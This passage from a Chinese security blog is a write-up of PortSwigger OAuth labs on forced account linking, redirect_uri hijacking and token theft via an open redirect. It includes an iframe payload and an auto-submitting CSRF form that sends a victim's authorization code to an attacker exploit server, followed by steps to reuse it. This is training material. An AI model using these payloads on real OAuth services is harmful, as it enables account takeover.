<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span>iframe src<span class="token operator">=</span><span class="token string">"https://0ad800510493bb41c0ae20b800aa004d.web-security-academy.net/oauth-linking?code=k8gw_duVfcBUiN1irp_BkqHe8n_m9t06knW5iRVerQY"</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>iframe<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="image-20220723191029983.png" alt="image-20220723191029983" loading="lazy">·</p>
<p>最后点击<code>Deliver exploit to victim</code>将漏洞利用传递给了客户端，当其加载了<code>iframe</code>标签的时候将使用恶意的社交媒体配置文件完成 OAuth 流程，并将其附加到博客网站上的管理员帐户</p>
<p>之后退出账户重新使用社交账户进行登陆</p>
<p><img src="image-20220723192747647.png" alt="image-20220723192747647" loading="lazy"></p>
<p>已经成为了管理员账户，之后删除掉<code>carlos</code>账户完成漏洞利用</p>
<h3 id="OAuth服务端中的利用"><a href="#OAuth服务端中的利用" class="headerlink" title="OAuth服务端中的利用"></a><code>OAuth</code>服务端中的利用</h3><h4 id="Leaking-authorization-codes-and-access-tokens"><a href="#Leaking-authorization-codes-and-access-tokens" class="headerlink" title="Leaking authorization codes and access tokens"></a>Leaking authorization codes and access tokens</h4><p>根据授权类型，代码获取token将被发送到授权请求的<code>redirect_uri</code>参数中的位置，如果服务端没有正确的校验这个URI，攻击者就能够通过这个漏洞将客户端的codes 和 token发送到攻击者控制的<code>redirect_uri</code>参数指定位置。那么攻击者就可以利用这些信息发送到服务端合法的<code>redirect_uri</code>地址中，就能成功获取用户的账户的访问权限</p>
<h5 id="Lab-OAuth-account-hijacking-via-redirect-uri"><a href="#Lab-OAuth-account-hijacking-via-redirect-uri" class="headerlink" title="Lab: OAuth account hijacking via redirect_uri"></a>Lab: OAuth account hijacking via redirect_uri</h5><blockquote>
<p>​            This lab uses an <a target="_blank" rel="noopener" href="https://portswigger.net/web-security/oauth">OAuth</a> service to allow users to log in with their social media account. A  misconfiguration by the OAuth provider makes it possible for an attacker to steal authorization codes associated with other users’ accounts.        </p>
<p>​            To solve the lab, steal an authorization code associated  with the admin user, then use it to access their account and delete  Carlos.        </p>
<p>​            The admin user will open anything you send from the exploit  server and they always have an active session with the OAuth service.        </p>
</blockquote>
<h5 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h5><p>按照相同的手法登陆账户形成一个会话，之后logout账户，再次登陆账户发现不需要输入凭证了，那是因为有一个会话存在，观察http请求中</p>
<p><img src="image-20220723195341976.png" alt="image-20220723195341976" loading="lazy"></p>
<p>设置了重定向的url,我们将数据包发送到<code>Repeater</code>中修改<code>redirect_url</code></p>
<p><img src="image-20220723195514027.png" alt="image-20220723195514027" loading="lazy"></p>
<p>无论修改为什么，他都不会报错，且能够达到重定向的目的，我们就将这个参数改为恶意的服务器</p>
<p>之后查看日志，可以发现携带了一个授权码的链接</p>
<p><img src="image-20220723200529506.png" alt="image-20220723200529506" loading="lazy"></p>
<p>说明这里存在漏洞，能够将授权码泄漏到外部域中</p>
<p>我们首先抓取登陆账户的<code>client_id</code>页面的数据包，使用burp自带的CRSF生成方式生成poc</p>
<p>值得主意的是这里的poc是不能自动提交的，我们可以添加<code>aaa.submit()</code>自己提交</p>
<pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
  <span class="token comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">history<span class="token punctuation">.</span><span class="token function">pushState</span><span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://oauth-0a29007803ee0541c09844c7023800f4.web-security-academy.net/auth<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>aaa<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>client<span class="token entity" title="&#95;">&amp;#95;</span>id<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>i1lie2anm0etkpo3cphwt<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>redirect<span class="token entity" title="&#95;">&amp;#95;</span>uri<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https<span class="token entity" title="&#58;">&amp;#58;</span><span class="token entity" title="&#47;">&amp;#47;</span><span class="token entity" title="&#47;">&amp;#47;</span>exploit-0afb008c035005b4c09b44ed014b007d.web<span class="token entity" title="&#45;">&amp;#45;</span>security<span class="token entity" title="&#45;">&amp;#45;</span>academy<span class="token entity" title="&#46;">&amp;#46;</span>net<span class="token entity" title="&#47;">&amp;#47;</span>oauth<span class="token entity" title="&#45;">&amp;#45;</span>callback<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>response<span class="token entity" title="&#95;">&amp;#95;</span>type<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>code<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>hidden<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scope<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>openid<span class="token entity" title="&#32;">&amp;#32;</span>profile<span class="token entity" title="&#32;">&amp;#32;</span>email<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Submit request<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
   <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">aaa<span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>我们可以测试这个是否可行，在漏洞利用服务器中的<code>View</code>选项，可以发送payload</p>
<p>可以在日志记录中发现生成的授权码</p>
<p><img src="image-20220723205006253.png" alt="image-20220723205006253" loading="lazy"></p>
<p>我们直接攻击受害者，也成功返回了admin的授权码</p>
<p><img src="image-20220723205043844.png" alt="image-20220723205043844" loading="lazy"></p>
<p>使用授权码，加上原始<code>redirect_uri</code>登陆</p>
<p><img src="image-20220723205429470.png" alt="image-20220723205429470" loading="lazy"></p>
<p>成功登陆admin</p>
<h4 id="Stealing-codes-and-access-tokens-via-a-proxy-page"><a href="#Stealing-codes-and-access-tokens-via-a-proxy-page" class="headerlink" title="Stealing codes and access tokens via a proxy page"></a>Stealing codes and access tokens via a proxy page</h4><p>这个应该是上一个的升级版，<code>redirect_uri</code>不能传递到外部域当中，但是也提出了一种利用的思路</p>
<p>可以尝试找到可以成功访问不同子域或路径得方法，可以通过目录穿越来寻找白名单</p>
<h5 id="Lab-Stealing-OAuth-access-tokens-via-an-open-redirect"><a href="#Lab-Stealing-OAuth-access-tokens-via-an-open-redirect" class="headerlink" title="Lab: Stealing OAuth access tokens via an open redirect"></a>Lab: Stealing OAuth access tokens via an open redirect</h5><h5 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h5><p>同样的步骤进行首次登陆，之后再次登陆，获取<code>client_id</code></p>
<p>虽然<code>redirect_uri</code>不能指定外部域，但是我们可以发现这里存在一个目录穿越漏洞，我们可以通过<code>../</code>进行穿越</p>
<p><img src="image-20220723212351737.png" alt="image-20220723212351737" loading="lazy"></p>
<p>同时我们可以发现在<code>下一篇文章</code>中对应的<code>/post/next?path=</code>参数存在有开方式重定向，甚至可以指定完整域名进行重定向</p>
<p><img src="image-20220723212720768.png" alt="image-20220723212720768" loading="lazy"></p>
<p>将漏洞利用传递给受害者，然后从日志中复制他们的token。在 Repeater 中，转到 GET /me 请求并将 Authorization: Bearer 标头中的token替换为您刚刚复制的token。发送请求。观察您已成功进行 API 调用以获取受害者的数据，包括他们的 API 密钥。</p>
</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">I'm so cute. Please give me money.</div><div id="qr" style="display:none;"><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/B01E5F9A0F70645FFD7D980FB6243619.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/D4AD9FA7BDA95604D2919F414577B0BA.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a target="_blank" rel="noopener" href="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg"><img loading="lazy" src="https://my-wsl.oss-cn-chengdu.aliyuncs.com/imgs/E8775427D2C8BC65C9AC73AE4CE5A3D8.jpg" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>RoboTerh</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/" title="浅析OAuth vul">https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
  const clipboardData = event.clipboardData || window.clipboardData;
  if (!clipboardData) { return; }
  const text = window.getSelection().toString();
  if (text) {
    event.preventDefault();
    clipboardData.setData('text/plain', text + '\n\nPost author: RoboTerh\nPost link: https://roboterh.github.io/2022/07/23/%E6%B5%85%E6%9E%90OAuch-vul/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
  }
});</script></section></article><div class="post-nav"><div class="post-nav-item"></div><div class="post-nav-item"><a class="post-nav-next" href="/2022/07/01/GoAhead%E5%8E%86%E5%8F%B2%E6%B4%9E%E5%88%86%E6%9E%90/" rel="next" title="GoAhead历史洞分析"><span class="post-nav-text">GoAhead历史洞分析</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么？</span><br></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> RoboTerh</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.7.0</span></div></footer><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></div></body></html>